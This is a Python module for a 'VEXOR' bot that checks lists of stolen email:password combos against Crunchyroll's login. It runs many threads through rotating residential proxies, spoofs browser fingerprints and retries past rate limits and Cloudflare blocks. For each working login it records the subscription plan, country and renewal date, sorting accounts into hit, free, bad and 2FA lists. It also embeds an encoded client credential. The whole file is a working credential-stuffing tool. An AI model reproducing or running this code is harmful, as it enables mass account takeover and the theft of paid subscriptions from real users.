#!/usr/bin/env python3
"""Crunchyroll checker module for VEXOR bot — v7.1 SSO/Cookie Flow + curl_cffi + Smart Proxy Cascade + Full Debug."""

import base64
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import hashlib
import json
import random
import re
import threading
import time
import uuid

import config
from config import (
    get_proxy_for_attempt,
    log,
    report_proxy_fail,
    report_proxy_ok,
    resolve_country_code,
)
import requests
from requests.adapters import HTTPAdapter
import urllib3
from urllib3.util.retry import Retry

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
  from curl_cffi import requests as curl_requests
  CURL_OK = True
except ImportError:
  CURL_OK = False

# Basic auth header for web token exchange (noaihdevm_6iyg0a8l0q:)
WEB_BASIC = base64.b64decode(
    "Ym05aGFXaGtaWFp0WHpacGVXY3dZVGhzTUhFNg=="
).decode("utf-8")

PLAN_MAP = {
    "streams.4": "MEGA FAN",
    "streams.1": "FAN",
    "streams.6": "ULTIMATE FAN",
}

TIMEOUT = 20
MAX_ATTEMPTS = 4  # 0: Static #1, 1: Static #2, 2: Res SID #1, 3: Res SID #2


def _dbg(email, stage, proxy_lbl="", status_code=None, text=None, exc=None):
  parts = [f"[{email}] STAGE={stage}"]
  if proxy_lbl:
    parts.append(f"PROXY={proxy_lbl}")
  if status_code is not None:
    parts.append(f"HTTP={status_code}")
  if exc is not None:
    parts.append(f"EXC={type(exc).__name__}({exc})")
  if text is not None:
    snippet = text.strip()[:350].replace("\n", " ")
    parts.append(f"BODY={snippet!r}")
  log("crunchy-dbg", " | ".join(parts), level="DEBUG")


def _make_session(proxy_url=None):
  """Create a session using curl_cffi (safari_ios impersonation) if available, else requests."""
  if CURL_OK:
    try:
      s = curl_requests.Session(impersonate="safari_ios")
    except Exception:
      s = curl_requests.Session()
  else:
    s = requests.Session()
    retry = Retry(
        total=0,
        connect=0,
        read=0,
        status=0,
        allowed_methods=frozenset(["GET", "POST"]),
    )
    adapter = HTTPAdapter(
        max_retries=retry,
        pool_connections=64,
        pool_maxsize=64,
        pool_block=False,
    )
    s.mount("https://", adapter)
    s.mount("http://", adapter)

  if proxy_url:
    if not proxy_url.startswith(("http://", "https://", "socks5://", "socks4://")):
      proxy_url = f"http://{proxy_url}"
    s.proxies = {"http": proxy_url, "https": proxy_url}
  try:
    s.verify = False
  except Exception:
    pass
  return s


def _req(session, method, url, **kw):
  try:
    return session.request(method, url, timeout=TIMEOUT, **kw), None
  except requests.exceptions.ProxyError as e:
    return None, f"proxy_dead:{str(e)[:60]}"
  except requests.exceptions.SSLError as e:
    return None, f"ssl:{str(e)[:60]}"
  except requests.exceptions.ConnectTimeout:
    return None, "connect_timeout"
  except requests.exceptions.ReadTimeout:
    return None, "read_timeout"
  except requests.exceptions.ConnectionError:
    return None, "conn_err"
  except Exception as e:
    return None, f"{type(e).__name__}:{str(e)[:60]}"


def _get_cookie(session, name):
  try:
    v = session.cookies.get(name)
    if v:
      return v
  except Exception:
    pass
  try:
    d = session.cookies.get_dict()
    if name in d:
      return d[name]
  except Exception:
    pass
  try:
    for ck in session.cookies.jar:
      if ck.name == name:
        return ck.value
  except Exception:
    pass
  return None


def _do_sso_check(email, password, proxy_url, proxy_lbl):
  """Execute the 5-step v7.1 SSO / Cookie flow against Crunchyroll."""
  sess = _make_session(proxy_url)
  try:
    # ── Step 1: SSO Login ──
    body_json = json.dumps(
        {
            "email": email,
            "password": password,
            "recaptchaToken": "",
            "eventSettings": {},
        },
        separators=(",", ":"),
    )
    body_sha = hashlib.sha256(body_json.encode()).hexdigest()

    h1 = {
        "x-amz-content-sha256": body_sha,
        "sec-ch-ua-platform": '"Windows"',
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            " (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36 Edg/156.0.0.0"
        ),
        "sec-ch-ua": (
            '"Not:A-Brand";v="8", "Chromium";v="156", "Microsoft Edge";v="156"'
        ),
        "Content-Type": "application/json",
        "sec-ch-ua-mobile": "?0",
        "Accept": "*/*",
        "Origin": "https://sso.crunchyroll.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://sso.crunchyroll.com/login",
        "Accept-Language": "es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
    }

    r, err = _req(
        sess,
        "POST",
        "https://sso.crunchyroll.com/api/login",
        headers=h1,
        data=body_json,
    )
    if r is None:
      _dbg(email, "SSO_FAIL", proxy_lbl=proxy_lbl, text=str(err))
      return ("error", {"err": f"sso:{err}"})

    _dbg(
        email,
        "SSO",
        proxy_lbl=proxy_lbl,
        status_code=r.status_code,
        text=r.text,
    )

    if r.status_code == 429 or "<!doctype html>" in (r.text or "")[:80].lower():
      return ("retry", {"reason": "cf_429"})

    src = r.text or ""
    low = src.lower()

    if '"invalid_credentials"' in src or r.status_code == 401:
      return ("invalid", {})
    if "force_password_reset" in low:
      return ("2fa", {})
    if "too_many_requests" in low or "something_went_wrong" in low:
      return ("retry", {"reason": "api_429"})
    if r.status_code == 403:
      return ("retry", {"reason": "cf_403"})
    if '"status":"ok"' not in src:
      return ("error", {"err": f"sso_unexpected:{src[:80]}"})

    device_id = _get_cookie(sess, "device_id")
    etp_rt = _get_cookie(sess, "etp_rt")
    _dbg(
        email,
        "COOKIES",
        proxy_lbl=proxy_lbl,
        text=f"device_id={'yes' if device_id else 'no'} etp_rt={'yes' if etp_rt else 'no'}",
    )
    if not device_id:
      return ("error", {"err": "no_device_id"})

    # ── Step 2: Token Exchange (grant_type=etp_rt_cookie) ──
    h2 = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:154.0)"
            " Gecko/20100101 Firefox/154.0"
        ),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
        "Referer": "https://www.crunchyroll.com/es-es/discover",
        "Content-Type": "application/x-www-form-urlencoded",
        "Authorization": f"Basic {WEB_BASIC}",
        "ETP-Anonymous-Id": etp_rt or str(uuid.uuid4()),
        "Origin": "https://www.crunchyroll.com",
        "Sec-GPC": "1",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
    }
    token_body = (
        f"device_id={device_id}"
        "&device_type=Firefox%20on%20Windows"
        "&grant_type=etp_rt_cookie"
    )

    r, err = _req(
        sess,
        "POST",
        "https://www.crunchyroll.com/auth/v1/token",
        headers=h2,
        data=token_body,
    )
    if r is None:
      _dbg(email, "TOKEN_FAIL", proxy_lbl=proxy_lbl, text=str(err))
      return ("error", {"err": f"tok:{err}"})

    _dbg(
        email,
        "TOKEN",
        proxy_lbl=proxy_lbl,
        status_code=r.status_code,
        text=r.text,
    )

    if r.status_code == 429 or "<!doctype html>" in (r.text or "")[:80].lower():
      return ("retry", {"reason": "cf_429"})

    m = re.search(r'"access_token"\s*:\s*"([^"]+)"', r.text or "")
    if not m:
      if "invalid_grant" in (r.text or "") or r.status_code in (400, 401):
        return ("invalid", {})
      return ("error", {"err": f"tok_parse:{(r.text or '')[:80]}"})
    token = m.group(1)

    m_prof = re.search(r'"profile_id"\s*:\s*"([^"]+)"', r.text or "")
    profile = m_prof.group(1) if m_prof else ""

    # ── Step 3: /accounts/v1/me ──
    hme = {
        "User-Agent": (
            "Crunchyroll/ANDROIDTV/3.80.0_22374 (Android 14; es-ES; SHG07)"
        ),
        "Authorization": f"Bearer {token}",
    }
    r, err = _req(
        sess,
        "GET",
        "https://beta-api.crunchyroll.com/accounts/v1/me",
        headers=hme,
    )
    if r is None:
      _dbg(email, "ME_FAIL", proxy_lbl=proxy_lbl, text=str(err))
      return ("error", {"err": f"me:{err}"})

    _dbg(
        email,
        "ME",
        proxy_lbl=proxy_lbl,
        status_code=r.status_code,
        text=r.text,
    )

    me_text = r.text or ""
    if '"has_password":false' in me_text:
      return ("2fa", {})
    if "account_locked" in me_text.lower() or "suspended" in me_text.lower():
      return ("locked", {})

    m_ext = re.search(r'"external_id"\s*:\s*"([^"]+)"', me_text)
    if not m_ext:
      return ("error", {"err": "no_ext_id"})
    ext = m_ext.group(1)

    # ── Step 4: Benefits ──
    hb = {
        "Authorization": f"Bearer {token}",
        "X-datadog-sampling-priority": "0",
        "Etp-anonymous-id": str(uuid.uuid4()),
        "User-Agent": (
            "Crunchyroll/ANDROIDTV/3.80.0_22374 (Android 14; es-ES; SHG07)"
        ),
    }
    r, err = _req(
        sess,
        "GET",
        f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{ext}/benefits",
        headers=hb,
    )
    if r is None:
      _dbg(email, "BEN_FAIL", proxy_lbl=proxy_lbl, text=str(err))
      return ("error", {"err": f"ben:{err}"})

    bsrc = r.text or ""
    _dbg(
        email,
        "BEN",
        proxy_lbl=proxy_lbl,
        status_code=r.status_code,
        text=bsrc,
    )

    if (
        "subscription.not_found" in bsrc
        or "Subscription Not Found" in bsrc
        or r.status_code == 404
        or '"subscription_country":' not in bsrc
    ):
      cc = resolve_country_code(email)
      return (
          "free",
          {
              "sku": "-",
              "plan": "FREE",
              "tier": "FREE",
              "country": cc,
              "country_code": cc,
              "expiry": "N/A",
              "renewal": "N/A",
              "days": -1,
          },
      )

    m_sub = re.search(r'"benefit"\s*:\s*"concurrent_([^"]+)"', bsrc)
    sub = m_sub.group(1) if m_sub else ""
    plan = PLAN_MAP.get(f"streams.{sub}", f"streams.{sub}" if sub else "FAN")

    # ── Step 5: Subscriptions v4 (Renewal Date & Country) ──
    expiry, days, country = "N/A", -1, ""
    if profile:
      r_sub, _ = _req(
          sess,
          "GET",
          f"https://beta-api.crunchyroll.com/subs/v4/accounts/{profile}/subscriptions",
          headers=hme,
      )
      if r_sub is not None:
        _dbg(
            email,
            "SUBS_V4",
            proxy_lbl=proxy_lbl,
            status_code=r_sub.status_code,
            text=r_sub.text,
        )
        sub_txt = r_sub.text or ""
        m_ren = re.search(r'"nextRenewalDate"\s*:\s*"([^"]+)"', sub_txt)
        if m_ren:
          expiry = m_ren.group(1).split("T")[0]
          try:
            days = (datetime.strptime(expiry, "%Y-%m-%d") - datetime.now()).days
          except Exception:
            pass
        m_cc = re.search(r'"countryCode"\s*:\s*"([^"]+)"', sub_txt)
        if m_cc:
          country = m_cc.group(1).strip().upper()

    if not country:
      m_sc = re.search(r'"subscription_country"\s*:\s*"([^"]+)"', bsrc)
      if m_sc:
        country = m_sc.group(1).strip().upper()

    cc = country or resolve_country_code(email)
    _dbg(
        email,
        "HIT",
        proxy_lbl=proxy_lbl,
        text=f"plan={plan} country={cc} expiry={expiry} days={days}",
    )

    return (
        "hit",
        {
            "sku": "-",
            "plan": plan,
            "tier": plan,
            "country": cc,
            "country_code": cc,
            "expiry": expiry,
            "renewal": expiry,
            "days": days,
        },
    )
  finally:
    try:
      sess.close()
    except Exception:
      pass


def check_account(email, password, job=None):
  """Check a Crunchyroll account using the 3-tier proxy cascade + quarantine:

  Attempt 0 -> Static Proxy #1
  Attempt 1 -> Static Proxy #2 (different IP)
  Attempt 2+ -> Residential Rotating Proxy (fresh SID IP each time)
  """
  prev_proxy = None
  retried = False
  last_cat = "error"

  for attempt in range(MAX_ATTEMPTS):
    if job and job.cancelled:
      return ("net", {})
    proxy_url, proxy_lbl = get_proxy_for_attempt(attempt, prev_proxy=prev_proxy)
    prev_proxy = proxy_url
    if attempt > 0:
      retried = True
      if job:
        with job.lock:
          job.retried += 1
      log(
          "crunchy-dbg",
          f"[{email}] RETRY attempt={attempt} switching to PROXY={proxy_lbl}",
          level="DEBUG",
      )

    cat, info = _do_sso_check(email, password, proxy_url, proxy_lbl)
    last_cat = cat

    if cat in ("hit", "free", "invalid", "2fa", "locked"):
      report_proxy_ok(proxy_url)
      if retried and job:
        with job.lock:
          job.recovered += 1
      if cat == "invalid":
        return ("bad", {})
      if cat == "locked":
        return ("2fa", {})
      return (cat, info)

    report_proxy_fail(proxy_url, reason=cat)
    if cat == "retry" and job:
      with job.lock:
        job.throttled += 1
    time.sleep(random.uniform(0.4, 1.0))

  log(
      "crunchy-dbg",
      f"[{email}] EXHAUSTED all {MAX_ATTEMPTS} attempts -> {last_cat}",
      level="DEBUG",
  )
  return ("net", {})


def run(job, reporter):
  """Run Crunchyroll v7.1 SSO checker with chunked submission and watcher thread."""
  max_workers = getattr(config, "CRUNCHY_THREADS", 25)
  log(
      "crunchyroll",
      f"start chat={job.chat_id} combos={len(job.combos)} workers={max_workers} curl_cffi={CURL_OK}",
      level="INFO",
  )

  done_evt = threading.Event()

  def _watcher():
    while not done_evt.is_set():
      try:
        reporter()
      except Exception as e:
        log("crunchyroll", f"reporter: {e}", "WARN")
      done_evt.wait(3)

  threading.Thread(target=_watcher, daemon=True).start()

  def worker(combo):
    if job.cancelled:
      return
    email, password = combo[0], combo[1]
    result, details = check_account(email, password, job=job)

    with job.lock:
      job.processed += 1
      job.done_keys.add((email.lower(), password))

      if result == "hit":
        job.valid += 1
        meta = {
            "tier": details.get("plan") or details.get("tier") or "Premium",
            "plan": details.get("plan") or details.get("tier") or "Premium",
            "sku": details.get("sku", "-"),
            "country": details.get("country")
            or details.get("country_code")
            or resolve_country_code(email),
            "renewal": details.get("expiry", "N/A"),
            "expiry": details.get("expiry", "N/A"),
            "days": details.get("days", -1),
        }
        job.valid_list.append((email, password, meta))
      elif result == "free":
        job.free += 1
        meta = {
            "tier": "FREE",
            "plan": "FREE",
            "sku": "-",
            "country": details.get("country")
            or details.get("country_code")
            or resolve_country_code(email),
            "renewal": "N/A",
            "expiry": "N/A",
            "days": -1,
        }
        job.free_list.append((email, password, meta))
      elif result == "2fa":
        job.twofa += 1
      elif result == "bad":
        job.bad += 1
      else:
        job.net += 1

  try:
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
      pending = set()
      for combo in job.combos:
        if job.cancelled:
          break
        while len(pending) >= max_workers * 2:
          done, pending = concurrent.futures.wait(
              pending, return_when=concurrent.futures.FIRST_COMPLETED
          )
          if job.cancelled:
            break
        if job.cancelled:
          break
        pending.add(executor.submit(worker, combo))

      for future in as_completed(pending):
        if job.cancelled:
          for fx in pending:
            fx.cancel()
          break
        try:
          future.result()
        except Exception as e:
          log("crunchyroll", f"Worker error: {e}", level="ERROR")
  finally:
    done_evt.set()
    try:
      reporter(force=True)
    except Exception:
      pass

  log(
      "crunchyroll",
      f"done chat={job.chat_id} valid={job.valid} free={job.free} "
      f"bad={job.bad} 2fa={job.twofa} net={job.net} "
      f"retried={job.retried} recovered={job.recovered}",
      "DONE",
  )
